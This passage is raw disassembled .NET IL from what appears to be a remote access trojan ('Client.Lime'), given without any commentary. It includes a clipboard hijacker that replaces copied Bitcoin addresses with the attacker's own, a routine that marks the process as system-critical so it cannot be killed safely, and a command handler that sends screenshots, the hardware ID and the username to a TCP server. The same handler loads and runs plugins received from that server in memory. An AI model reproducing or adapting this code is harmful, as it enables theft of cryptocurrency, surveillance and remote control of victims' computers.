      IL_0006:  ldarg.1
      IL_0007:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_000c:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy::SetText(string)
      IL_0011:  ret
    } // end of method '_Closure$__R1-0'::_Lambda$__R2

  } // end of class '_Closure$__R1-0'

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_BTC::.ctor

  .method public static void  _BTC_ST() cil managed
  {
    // Code size       182 (0xb6)
    .maxstack  3
    .locals init (string V_0,
             class Client.Lime.C_BTC/'_Closure$__R1-0' V_1,
             class [mscorlib]System.Exception V_2)
    IL_0000:  ldstr      ""
    IL_0005:  stloc.0
    IL_0006:  nop
    .try
    {
      IL_0007:  call       class Client.My.MyComputer Client.My.MyProject::get_Computer()
      IL_000c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Clipboard()
      IL_0011:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy::GetText()
      IL_0016:  stloc.0
      IL_0017:  ldloc.0
      IL_0018:  ldsfld     string Client.Lime.C_Settings::BTC_ADDR
      IL_001d:  ldc.i4.0
      IL_001e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0023:  brfalse.s  IL_0099

      IL_0025:  ldloc.0
      IL_0026:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_002b:  ldc.i4.s   26
      IL_002d:  blt.s      IL_0099

      IL_002f:  ldloc.0
      IL_0030:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0035:  ldc.i4.s   35
      IL_0037:  bgt.s      IL_0099

      IL_0039:  ldloc.0
      IL_003a:  ldstr      "1"
      IL_003f:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
      IL_0044:  brtrue.s   IL_0060

      IL_0046:  ldloc.0
      IL_0047:  ldstr      "3"
      IL_004c:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
      IL_0051:  brtrue.s   IL_0060

      IL_0053:  ldloc.0
      IL_0054:  ldstr      "bc1"
      IL_0059:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
      IL_005e:  brfalse.s  IL_0099

      IL_0060:  ldloc.1
      IL_0061:  newobj     instance void Client.Lime.C_BTC/'_Closure$__R1-0'::.ctor(class Client.Lime.C_BTC/'_Closure$__R1-0')
      IL_0066:  stloc.1
      IL_0067:  ldloc.1
      IL_0068:  call       class Client.My.MyComputer Client.My.MyProject::get_Computer()
      IL_006d:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Clipboard()
      IL_0072:  stfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy Client.Lime.C_BTC/'_Closure$__R1-0'::$VB$NonLocal_2
      IL_0077:  ldloc.1
      IL_0078:  ldftn      instance void Client.Lime.C_BTC/'_Closure$__R1-0'::_Lambda$__R2(object)
      IL_007e:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_0083:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart)
      IL_0088:  dup
      IL_0089:  ldc.i4.0
      IL_008a:  callvirt   instance void [mscorlib]System.Threading.Thread::SetApartmentState(valuetype [mscorlib]System.Threading.ApartmentState)
      IL_008f:  ldsfld     string Client.Lime.C_Settings::BTC_ADDR
      IL_0094:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0099:  ldc.i4.s   50
      IL_009b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00a0:  leave      IL_0006

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a5:  dup
      IL_00a6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ab:  stloc.2
      IL_00ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00b1:  leave      IL_0006
    }  // end handler
  } // end of method C_BTC::_BTC_ST

} // end of class Client.Lime.C_BTC

.class public auto ansi Client.Lime.C_CriticalProcess
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_CriticalProcess::.ctor

  .method public static pinvokeimpl("NTdll.dll" as "RtlSetProcessIsCritical" lasterr winapi) 
          void  SetCurrentProcessIsCritical(bool  marshal( bool) isCritical,
                                            bool&  marshal( bool) refWasCritical,
                                            bool  marshal( bool) needSystemCriticalBreaks) cil managed preservesig
  {
  }
  .method public static void  CriticalProcess_Enable() cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  call       void [System]System.Diagnostics.Process::EnterDebugMode()
      IL_0005:  ldc.i4.1
      IL_0006:  ldloca.s   V_0
      IL_0008:  ldc.i4.0
      IL_0009:  call       void Client.Lime.C_CriticalProcess::SetCurrentProcessIsCritical(bool,
                                                                                           bool&,
                                                                                           bool)
      IL_000e:  leave.s    IL_001e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0010:  dup
      IL_0011:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0016:  stloc.1
      IL_0017:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001c:  leave.s    IL_001e

    }  // end handler
    IL_001e:  ret
  } // end of method C_CriticalProcess::CriticalProcess_Enable

  .method public static void  CriticalProcesses_Disable() cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  ldloca.s   V_0
      IL_0003:  ldc.i4.0
      IL_0004:  call       void Client.Lime.C_CriticalProcess::SetCurrentProcessIsCritical(bool,
                                                                                           bool&,
                                                                                           bool)
      IL_0009:  leave.s    IL_0019

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_000b:  dup
      IL_000c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0011:  stloc.1
      IL_0012:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0017:  leave.s    IL_0019

    }  // end handler
    IL_0019:  ret
  } // end of method C_CriticalProcess::CriticalProcesses_Disable

} // end of class Client.Lime.C_CriticalProcess

.class public auto ansi beforefieldinit Client.Lime.C_Commands
       extends [mscorlib]System.Object
{
  .field private static object SPL
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     string Client.Lime.C_Settings::SPL
    IL_0005:  stsfld     object Client.Lime.C_Commands::SPL
    IL_000a:  ret
  } // end of method C_Commands::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_Commands::.ctor

  .method public static void  Data(uint8[] b) cil managed
  {
    // Code size       778 (0x30a)
    .maxstack  7
    .locals init (string[] V_0,
             string V_1,
             valuetype [System.Drawing]System.Drawing.Rectangle V_2,
             class [System.Drawing]System.Drawing.Bitmap V_3,
             class [System.Drawing]System.Drawing.Graphics V_4,
             valuetype [System.Drawing]System.Drawing.Size V_5,
             class [mscorlib]System.IO.MemoryStream V_6,
             class [System.Drawing]System.Drawing.Bitmap V_7,
             class [System.Drawing]System.Drawing.Graphics V_8,
             valuetype [System.Drawing]System.Drawing.Rectangle V_9,
             class [mscorlib]System.Exception V_10,
             bool V_11,
             class [mscorlib]System.Exception V_12)
    .try
    {
      IL_0000:  ldstr      "OK"
      IL_0005:  ldsfld     object Client.Lime.C_Commands::SPL
      IL_000a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_000f:  call       string Client.Lime.C_ID::HWID()
      IL_0014:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_0019:  ldsfld     object Client.Lime.C_Commands::SPL
      IL_001e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_0023:  call       object Client.Lime.C_ID::UserName()
      IL_0028:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_002d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0032:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_0037:  leave.s    IL_0045

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0043:  leave.s    IL_0045

    }  // end handler
    IL_0045:  ldarg.0
    IL_0046:  call       string Client.Lime.C_Fuctions::BS(uint8[])
    IL_004b:  call       object Client.Lime.C_Encryption::AES_Decrypt(string)
    IL_0050:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0055:  ldsfld     object Client.Lime.C_Commands::SPL
    IL_005a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_005f:  ldc.i4.m1
    IL_0060:  ldc.i4.0
    IL_0061:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0066:  stloc.0
    .try
    {
      IL_0067:  ldloc.0
      IL_0068:  ldc.i4.0
      IL_0069:  ldelem.ref
      IL_006a:  stloc.1
      IL_006b:  ldloc.1
      IL_006c:  ldstr      "!PSend"
      IL_0071:  ldc.i4.0
      IL_0072:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0077:  brfalse.s  IL_00cd

      IL_0079:  ldloc.1
      IL_007a:  ldstr      "!P"
      IL_007f:  ldc.i4.0
      IL_0080:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0085:  brfalse.s  IL_00e2

      IL_0087:  ldloc.1
      IL_0088:  ldstr      "!CAP"
      IL_008d:  ldc.i4.0
      IL_008e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0093:  brfalse.s  IL_00ed

      IL_0095:  ldloc.1
      IL_0096:  ldstr      "CPL"
      IL_009b:  ldc.i4.0
      IL_009c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00a1:  brfalse    IL_0231

      IL_00a6:  ldloc.1
      IL_00a7:  ldstr      "IPL"
      IL_00ac:  ldc.i4.0
      IL_00ad:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00b2:  brfalse    IL_0284

      IL_00b7:  ldloc.1
      IL_00b8:  ldstr      "IPLM"
      IL_00bd:  ldc.i4.0
      IL_00be:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00c3:  brfalse    IL_02af

      IL_00c8:  br         IL_02c9

      IL_00cd:  ldc.i4.1
      IL_00ce:  stsfld     bool Client.Lime.C_TcpClient::P_Start
      IL_00d3:  ldstr      "!PStart"
      IL_00d8:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_00dd:  br         IL_02c9

      IL_00e2:  ldc.i4.1
      IL_00e3:  stsfld     bool Client.Lime.C_TcpClient::P_Stop
      IL_00e8:  br         IL_02c9

      IL_00ed:  nop
      .try
      {
        IL_00ee:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
        IL_00f3:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
        IL_00f8:  stloc.2
        IL_00f9:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
        IL_00fe:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
        IL_0103:  stloc.s    V_9
        IL_0105:  ldloca.s   V_9
        IL_0107:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
        IL_010c:  ldloca.s   V_2
        IL_010e:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
        IL_0113:  ldc.i4     0x21005
        IL_0118:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                        int32,
                                                                                        valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
        IL_011d:  stloc.3
        IL_011e:  ldloc.3
        IL_011f:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
        IL_0124:  stloc.s    V_4
        IL_0126:  ldloc.3
        IL_0127:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
        IL_012c:  ldloc.3
        IL_012d:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
        IL_0132:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_0137:  stloc.s    V_5
        IL_0139:  ldloc.s    V_4
        IL_013b:  ldc.i4.0
        IL_013c:  ldc.i4.0
        IL_013d:  ldc.i4.0
        IL_013e:  ldc.i4.0
        IL_013f:  ldloc.s    V_5
        IL_0141:  ldc.i4     0xcc0020
        IL_0146:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                   int32,
                                                                                                   int32,
                                                                                                   int32,
                                                                                                   valuetype [System.Drawing]System.Drawing.Size,
                                                                                                   valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
        IL_014b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0150:  stloc.s    V_6
        IL_0152:  ldc.i4     0x100
        IL_0157:  ldc.i4     0x9c
        IL_015c:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                        int32)
        IL_0161:  stloc.s    V_7
        IL_0163:  ldloc.s    V_7
        IL_0165:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
        IL_016a:  stloc.s    V_8
        IL_016c:  ldloc.s    V_8
        IL_016e:  ldloc.3
        IL_016f:  ldc.i4.0
        IL_0170:  ldc.i4.0
        IL_0171:  ldc.i4     0x100
        IL_0176:  ldc.i4     0x9c
        IL_017b:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                           int32,
                                                                                           int32,
                                                                                           int32)
        IL_0180:  ldc.i4.0
        IL_0181:  ldc.i4.0
        IL_0182:  ldloc.3
        IL_0183:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
        IL_0188:  ldloc.3
        IL_0189:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
        IL_018e:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                           int32,
                                                                                           int32,
                                                                                           int32)
        IL_0193:  ldc.i4.2
        IL_0194:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle,
                                                                                              valuetype [System.Drawing]System.Drawing.GraphicsUnit)
        IL_0199:  ldloc.s    V_7
        IL_019b:  ldloc.s    V_6
        IL_019d:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
        IL_01a2:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                      class [System.Drawing]System.Drawing.Imaging.ImageFormat)
        IL_01a7:  ldstr      "#CAP"
        IL_01ac:  ldsfld     object Client.Lime.C_Commands::SPL
        IL_01b1:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                               object)
        IL_01b6:  call       object Client.Lime.C_ID::Bot()
        IL_01bb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                               object)
        IL_01c0:  ldsfld     object Client.Lime.C_Commands::SPL
        IL_01c5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                               object)
        IL_01ca:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
        IL_01cf:  ldloc.s    V_6
        IL_01d1:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_01d6:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
        IL_01db:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                               object)
        IL_01e0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_01e5:  call       void Client.Lime.C_TcpClient::Send(string)
        .try
        {
          IL_01ea:  ldloc.s    V_4
          IL_01ec:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
          IL_01f1:  ldloc.s    V_6
          IL_01f3:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_01f8:  ldloc.s    V_7
          IL_01fa:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
          IL_01ff:  ldloc.s    V_8
          IL_0201:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
          IL_0206:  ldloc.3
          IL_0207:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
          IL_020c:  leave.s    IL_021a

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_020e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0213:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0218:  leave.s    IL_021a

        }  // end handler
        IL_021a:  leave      IL_02c9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_021f:  dup
        IL_0220:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0225:  stloc.s    V_10
        IL_0227:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_022c:  leave      IL_02c9

      }  // end handler
      IL_0231:  ldloc.0
      IL_0232:  ldc.i4.1
      IL_0233:  ldelem.ref
      IL_0234:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0239:  ldnull
      IL_023a:  ldc.i4.0
      IL_023b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0240:  brtrue.s   IL_0265

      IL_0242:  ldstr      "GPL"
      IL_0247:  ldsfld     object Client.Lime.C_Commands::SPL
      IL_024c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_0251:  ldloc.0
      IL_0252:  ldc.i4.1
      IL_0253:  ldelem.ref
      IL_0254:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_0259:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_025e:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_0263:  br.s       IL_02c9

      IL_0265:  ldloc.0
      IL_0266:  ldc.i4.1
      IL_0267:  ldelem.ref
      IL_0268:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_026d:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0272:  ldc.i4.0
      IL_0273:  stloc.s    V_11
      IL_0275:  ldloca.s   V_11
      IL_0277:  call       uint8[] Client.Lime.C_Fuctions::GZip(uint8[],
                                                                bool&)
      IL_027c:  ldnull
      IL_027d:  call       void Client.Lime.C_Commands::Plugin(uint8[],
                                                               string)
      IL_0282:  br.s       IL_02c9

      IL_0284:  ldloc.0
      IL_0285:  ldc.i4.2
      IL_0286:  ldelem.ref
      IL_0287:  ldloc.0
      IL_0288:  ldc.i4.1
      IL_0289:  ldelem.ref
      IL_028a:  call       object Client.Lime.C_Fuctions::STV(string,
                                                              string)
      IL_028f:  pop
      IL_0290:  ldloc.0
      IL_0291:  ldc.i4.2
      IL_0292:  ldelem.ref
      IL_0293:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0298:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_029d:  ldc.i4.0
      IL_029e:  stloc.s    V_11
      IL_02a0:  ldloca.s   V_11
      IL_02a2:  call       uint8[] Client.Lime.C_Fuctions::GZip(uint8[],
                                                                bool&)
      IL_02a7:  ldnull
      IL_02a8:  call       void Client.Lime.C_Commands::Plugin(uint8[],
                                                               string)
      IL_02ad:  br.s       IL_02c9

      IL_02af:  ldloc.0
      IL_02b0:  ldc.i4.1
      IL_02b1:  ldelem.ref
      IL_02b2:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_02b7:  ldc.i4.0
      IL_02b8:  stloc.s    V_11
      IL_02ba:  ldloca.s   V_11
      IL_02bc:  call       uint8[] Client.Lime.C_Fuctions::GZip(uint8[],
                                                                bool&)
      IL_02c1:  ldloc.0
      IL_02c2:  ldc.i4.2
      IL_02c3:  ldelem.ref
      IL_02c4:  call       void Client.Lime.C_Commands::Plugin(uint8[],
                                                               string)
      IL_02c9:  leave.s    IL_0309

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02cb:  dup
      IL_02cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02d1:  stloc.s    V_12
      IL_02d3:  ldstr      "MSG"
      IL_02d8:  ldsfld     object Client.Lime.C_Commands::SPL
      IL_02dd:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_02e2:  ldstr      "Error! "
      IL_02e7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_02ec:  ldloc.s    V_12
      IL_02ee:  callvirt   instance string [mscorlib]System.Exception::get_Message()
      IL_02f3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AddObject(object,
                                                                                                                     object)
      IL_02f8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_02fd:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_0302:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0307:  leave.s    IL_0309

    }  // end handler
    IL_0309:  ret
  } // end of method C_Commands::Data

  .method public static void  Plugin(uint8[] B,
                                     [opt] string CMD) cil managed
  {
    .param [2] = nullref
    // Code size       397 (0x18d)
    .maxstack  6
    .locals init (class [mscorlib]System.Type[] V_0,
             int32 V_1,
             class [mscorlib]System.Reflection.MethodInfo[] V_2,
             int32 V_3,
             class [mscorlib]System.Reflection.MethodInfo V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_0005:  ldarg.0
      IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.AppDomain::Load(uint8[])
      IL_000b:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Assembly::GetTypes()
      IL_0010:  stloc.0
      IL_0011:  ldc.i4.0
      IL_0012:  stloc.1
      IL_0013:  br         IL_0143

      IL_0018:  ldloc.0
      IL_0019:  ldloc.1
      IL_001a:  ldelem.ref
      IL_001b:  callvirt   instance class [mscorlib]System.Reflection.MethodInfo[] [mscorlib]System.Type::GetMethods()
      IL_0020:  stloc.2
      IL_0021:  ldc.i4.0
      IL_0022:  stloc.3
      IL_0023:  br         IL_0136

      IL_0028:  ldloc.2
      IL_0029:  ldloc.3
      IL_002a:  ldelem.ref
      IL_002b:  stloc.s    V_4
      IL_002d:  ldloc.s    V_4
      IL_002f:  callvirt   instance string [mscorlib]System.Reflection.MemberInfo::get_Name()
      IL_0034:  ldstr      "CN"
      IL_0039:  ldc.i4.0
      IL_003a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_003f:  brtrue.s   IL_00a8

      IL_0041:  ldloc.s    V_4
      IL_0043:  ldnull
      IL_0044:  ldc.i4.s   9
      IL_0046:  newarr     [mscorlib]System.Object
      IL_004b:  dup
      IL_004c:  ldc.i4.0
      IL_004d:  ldsfld     string Client.Lime.C_Settings::HOST
      IL_0052:  stelem.ref
      IL_0053:  dup
      IL_0054:  ldc.i4.1
      IL_0055:  ldsfld     int32 Client.Lime.C_Settings::PORT
      IL_005a:  box        [mscorlib]System.Int32
      IL_005f:  stelem.ref
      IL_0060:  dup
      IL_0061:  ldc.i4.2
      IL_0062:  ldsfld     string Client.Lime.C_TcpClient::ENDOF
      IL_0067:  stelem.ref
      IL_0068:  dup
      IL_0069:  ldc.i4.3
      IL_006a:  ldsfld     string Client.Lime.C_TcpClient::SPL
      IL_006f:  stelem.ref
      IL_0070:  dup
      IL_0071:  ldc.i4.4
      IL_0072:  ldsfld     string Client.Lime.C_Settings::EncryptionKey
      IL_0077:  stelem.ref
      IL_0078:  dup
      IL_0079:  ldc.i4.5
      IL_007a:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_007f:  stelem.ref
      IL_0080:  dup
      IL_0081:  ldc.i4.6
      IL_0082:  call       string Client.Lime.C_ID::HWID()
      IL_0087:  stelem.ref
      IL_0088:  dup
      IL_0089:  ldc.i4.7
      IL_008a:  call       object Client.Lime.C_ID::Bot()
      IL_008f:  stelem.ref
      IL_0090:  dup
      IL_0091:  ldc.i4.8
      IL_0092:  ldsfld     string Client.Lime.C_Settings::Pastebin
      IL_0097:  call       object Client.Lime.C_Encryption::AES_Decrypt(string)
      IL_009c:  stelem.ref
      IL_009d:  callvirt   instance object [mscorlib]System.Reflection.MethodBase::Invoke(object,
                                                                                          object[])
      IL_00a2:  pop
      IL_00a3:  br         IL_0132

      IL_00a8:  ldloc.s    V_4
      IL_00aa:  callvirt   instance string [mscorlib]System.Reflection.MemberInfo::get_Name()
      IL_00af:  ldstr      "MISC"
      IL_00b4:  ldc.i4.0
      IL_00b5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00ba:  brtrue.s   IL_00d9

      IL_00bc:  ldloc.s    V_4
      IL_00be:  ldnull
      IL_00bf:  ldc.i4.2
      IL_00c0:  newarr     [mscorlib]System.Object
      IL_00c5:  dup
      IL_00c6:  ldc.i4.0
      IL_00c7:  call       string Client.Lime.C_ID::HWID()
      IL_00cc:  stelem.ref
      IL_00cd:  dup
      IL_00ce:  ldc.i4.1
      IL_00cf:  ldarg.1
      IL_00d0:  stelem.ref
      IL_00d1:  callvirt   instance object [mscorlib]System.Reflection.MethodBase::Invoke(object,
                                                                                          object[])
      IL_00d6:  pop
      IL_00d7:  br.s       IL_0132

      IL_00d9:  ldloc.s    V_4
      IL_00db:  callvirt   instance string [mscorlib]System.Reflection.MemberInfo::get_Name()
      IL_00e0:  ldstr      "CL"
      IL_00e5:  ldc.i4.0
